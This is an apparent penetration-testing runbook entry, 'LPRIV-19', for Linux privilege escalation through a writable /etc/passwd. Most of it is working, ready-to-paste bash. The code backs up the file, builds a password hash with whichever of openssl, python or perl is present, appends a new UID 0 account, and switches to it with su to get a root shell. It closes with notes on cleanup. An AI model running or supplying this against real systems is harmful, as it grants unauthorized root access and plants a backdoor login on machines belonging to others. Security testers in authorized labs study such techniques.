# LPRIV-19. Writable `/etc/passwd`

**Run this when:** `/etc/passwd` is writable by the current user.

Writable check, backup:

```bash
ls -l /etc/passwd
cp --preserve=all -- /etc/passwd /tmp/passwd.bak
sha256sum -- /etc/passwd /tmp/passwd.bak
command -v openssl python3 python2 perl
```

**Look for:** owner write on the file, and any one hash tool in the list. The
account is added to `/etc/passwd` only; `/etc/shadow` stays untouched, so the
hash lives in that second field. Field 2 accepts any crypt(3) hash the box's
glibc understands, not one fixed algorithm.

**If found:** this block is self-contained, so paste it alone.

Password, hash, append:

```bash
PW='test'; NAME=test
while getent passwd "$NAME" >/dev/null; do NAME="${NAME}0"; done

HASH=$( { openssl passwd -6 "$PW"; python3 -c 'import crypt,sys; print(crypt.crypt(sys.argv[1], crypt.mksalt(crypt.METHOD_SHA512)))' "$PW"; python2 -c 'import crypt,sys; print crypt.crypt(sys.argv[1], "$6$test$")' "$PW"; perl -e 'print crypt($ARGV[0], q($1$test$))' "$PW"; openssl passwd -1 "$PW"; } 2>/dev/null | grep '^\$' | head -n1 )
[ -n "$HASH" ] || HASH=$(openssl passwd -crypt "$PW")

printf '%s:%s:0:0:root:/root:%s\n' "$NAME" "$HASH" "$(command -v bash || command -v sh || echo /bin/sh)" >> /etc/passwd
getent passwd "$NAME"
su - "$NAME"
```

Every tool runs; `grep '^\$'` drops the usage text and missing binaries, so the
first real hash wins. Only OpenSSL older than 1.0 produces none, and it falls to
`-crypt`, which truncates to eight characters.

`su -` starts a root login in `/root` with root's environment. The outer shell
stays michael, whose `/root` is `550`, so `cd /root` fails until you are inside
`su`. Run `id` to confirm `uid=0`.

`su` prompts for the password you set; it is not passwordless. Remove the line
afterwards, or restore the copy when the file must stay byte-exact. A second UID
0 account is a real login, not a modified user.


